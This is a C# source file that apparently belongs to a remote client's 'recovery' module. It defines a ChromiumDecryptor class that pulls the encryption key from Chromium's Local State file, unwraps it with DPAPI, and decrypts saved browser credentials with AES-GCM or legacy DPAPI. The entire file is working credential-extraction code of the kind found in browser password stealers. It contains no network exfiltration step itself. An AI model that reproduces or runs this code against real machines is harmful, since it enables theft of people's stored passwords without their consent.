using Pulsar.Client.Recovery.Utilities;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace Pulsar.Client.Recovery.Browsers
{
    /// <summary>
    /// Provides methods to decrypt Chromium credentials.
    /// </summary>
    public class ChromiumDecryptor
    {
        private readonly byte[] _key;
        public bool IsAvailable { get; private set; }
        public bool IsLocked { get; private set; }
        public string LastError { get; private set; }

        public ChromiumDecryptor(string localStatePath)
        {
            try
            {
                if (string.IsNullOrEmpty(localStatePath) || !File.Exists(localStatePath))
                {
                    IsLocked = true;
                    LastError = "Local State is missing.";
                    return;
                }

                string localState = File.ReadAllText(localStatePath);
                Match match = Regex.Match(localState, "\"encrypted_key\"\\s*:\\s*\"([^\"]+)\"", RegexOptions.IgnoreCase);
                if (!match.Success)
                {
                    IsLocked = true;
                    LastError = "Encrypted key is not present.";
                    return;
                }

                byte[] encryptedKey = Convert.FromBase64String(match.Groups[1].Value);
                if (encryptedKey.Length < 5)
                {
                    IsLocked = true;
                    LastError = "Encrypted key is malformed.";
                    return;
                }

                string prefix = Encoding.ASCII.GetString(encryptedKey, 0, 5);
                if (!string.Equals(prefix, "DPAPI", StringComparison.Ordinal))
                {
                    IsLocked = true;
                    LastError = "Unsupported Chromium key envelope.";
                    return;
                }

                _key = ProtectedData.Unprotect(encryptedKey.Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);
                IsAvailable = _key != null && _key.Length == 32;
                if (!IsAvailable)
                {
                    IsLocked = true;
                    LastError = "Chromium encryption key is unavailable.";
                }
            }
            catch (Exception e)
            {
                IsLocked = true;
                LastError = e.Message;
            }
        }

        public string Decrypt(string cipherText)
        {
            try
            {
                if (string.IsNullOrEmpty(cipherText))
                    return "";

                var cipherTextBytes = Encoding.Default.GetBytes(cipherText);
                if (cipherTextBytes.Length >= 3 &&
                    Encoding.ASCII.GetString(cipherTextBytes, 0, 3) == "v20")
                {
                    IsLocked = true;
                    LastError = "App-bound Chromium credentials are unsupported.";
                    return string.Empty;
                }

                if (cipherTextBytes.Length >= 3 &&
                    (Encoding.ASCII.GetString(cipherTextBytes, 0, 3) == "v10" ||
                     Encoding.ASCII.GetString(cipherTextBytes, 0, 3) == "v11"))
                {
                    if (!IsAvailable)
                        return string.Empty;

                    var initialisationVector = cipherTextBytes.Skip(3).Take(12).ToArray();
                    var encryptedData = cipherTextBytes.Skip(15).ToArray();
                    if (encryptedData.Length < 16)
                        return string.Empty;

                    var actualEncryptedData = encryptedData.Take(encryptedData.Length - 16).ToArray();
                    var authTag = encryptedData.Skip(encryptedData.Length - 16).ToArray();
                    var decryptedPassword = DecryptAesGcm(actualEncryptedData, _key, initialisationVector, authTag);
                    return decryptedPassword == null ? string.Empty : Encoding.UTF8.GetString(decryptedPassword);
                }

                if (!cipherTextBytes.SequenceEqual(new byte[0]))
                {
                    try
                    {
                        byte[] dpapi = ProtectedData.Unprotect(cipherTextBytes, null, DataProtectionScope.CurrentUser);
                        return dpapi == null ? string.Empty : Encoding.UTF8.GetString(dpapi);
                    }
                    catch
                    {
                        IsLocked = true;
                        LastError = "Legacy Chromium credential is locked.";
                    }
                }

                return string.Empty;
            }
            catch (Exception e)
            {
                Debug.WriteLine(e);
                return "";
            }
        }

        private byte[] DecryptAesGcm(byte[] encryptedPassword, byte[] key, byte[] nonce, byte[] authTag)
        {
            const int KEY_BIT_SIZE = 256;

            if (key == null || key.Length != KEY_BIT_SIZE / 8)
            {
                Debug.WriteLine("Key is null or invalid length!");
                return null;
            }
            if (encryptedPassword == null || encryptedPassword.Length == 0)
            {
                Debug.WriteLine("Encrypted password is empty!");
                return null;
            }


            AesGcmBetter AES = new AesGcmBetter();
            var output = new byte[0];

            try
            {
                output = AES.Decrypt(key, nonce, null, encryptedPassword, authTag);
            }
            catch (Exception e)
            {
                Debug.WriteLine(e);
                return null;
            }
            return output;
        }
    }
}